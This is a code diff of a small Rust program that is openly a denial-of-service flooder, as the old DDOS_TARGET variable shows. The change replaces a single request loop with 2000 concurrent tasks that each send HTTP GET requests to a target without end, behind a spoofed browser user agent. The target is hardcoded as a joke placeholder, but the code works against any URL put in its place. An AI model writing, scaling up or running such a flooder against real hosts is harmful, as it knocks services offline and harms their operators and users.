@@ -1,31 +1,48 @@
-#![allow(unused_must_use)]
+use tokio::task::JoinHandle;
 
-use reqwest::Client;
+use reqwest::{
+    header::{self, HeaderMap},
+    Client,
+};
 
 #[tokio::main]
 async fn main() {
-    let target: String;
-    let mut i: i64 = 1;
+    let thread_spawn = 2000;
+    let target = "ur mum";
 
-    if let Ok(env) = std::env::var("DDOS_TARGET") {
-        target = env;
-    } else {
-        println!("DDOS_TARGET not set");
-        std::process::exit(1);
+    let mut headers = HeaderMap::new();
+    headers.insert(
+        header::USER_AGENT,
+        header::HeaderValue::from_str(
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0",
+        )
+        .unwrap(),
+    );
+
+    let client_builder = Client::builder().default_headers(headers);
+
+    let client = client_builder.build().unwrap();
+
+    let mut handles: Vec<JoinHandle<()>> = vec![];
+
+    for _ in 0..thread_spawn {
+        let client = client.clone();
+
+        let handle = tokio::spawn(async move {
+            loop {
+                let res = client.get(target).send().await;
+
+                match res {
+                    Ok(res) => println!("Status: {}", res.status()),
+                    Err(err) => println!("Error: {}", err),
+                }
+            }
+        });
+
+        handles.push(handle);
     }
 
-    let http_client = Client::new();
-
-    loop {
-        println!("{} | Sending request to {}", i, &target);
-        i += 1;
-
-        let request = http_client.get(&target).send().await;
-
-        if let Ok(response) = request {
-            println!("Response: {}", response.status());
-        } else {
-            println!("Request failed");
-        }
+    for handle in handles {
+        let _ = handle.await;
     }
 }
